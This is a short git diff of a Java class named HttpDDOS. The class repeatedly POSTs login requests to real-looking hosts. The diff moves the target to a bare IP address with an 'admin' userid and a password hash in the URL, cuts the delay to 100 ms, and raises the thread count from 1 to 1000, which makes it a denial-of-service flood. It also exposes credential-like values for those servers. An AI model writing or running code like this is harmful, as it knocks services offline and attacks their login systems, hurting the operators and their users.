@@ -9,10 +9,11 @@ public class HttpDDOS implements Runnable {
     @Override
     public void run() {
         while (true) {
-            String URL = "http://eos.ejiakeji.cn:8787/eMWX2.0/ex/user/login.do?userid=1111&pwd=b59c67bf196a4758191e42f76670ceba&dynamic_code=&client_token=&host=&_responseCrypted=false";
-            HttpUtil.doPost(URL);
+            String URL = "http://122.112.174.92:8015/eai_maple/ex/user/login.do?userid=admin&pwd=ba67e6279dd5e0e3f468afe28e5dc992&dynamic_code=&client_token=&host=&_responseCrypted=false";
+            String s = HttpUtil.doPost(URL);
+            System.out.println(s);
             try {
-                Thread.sleep(1000);
+                Thread.sleep(100);
             } catch (InterruptedException e) {
                 e.printStackTrace();
             }
@@ -21,14 +22,11 @@ public class HttpDDOS implements Runnable {
 }
 
 class Main1 {
-
     public static void main(String[] args) {
-
-        for (int i = 0; i < 1; i++) {
+        for (int i = 0; i < 1000; i++) {
             HttpDDOS main = new HttpDDOS();
             Thread thread = new Thread(main);
             thread.start();
         }
-
     }
 }
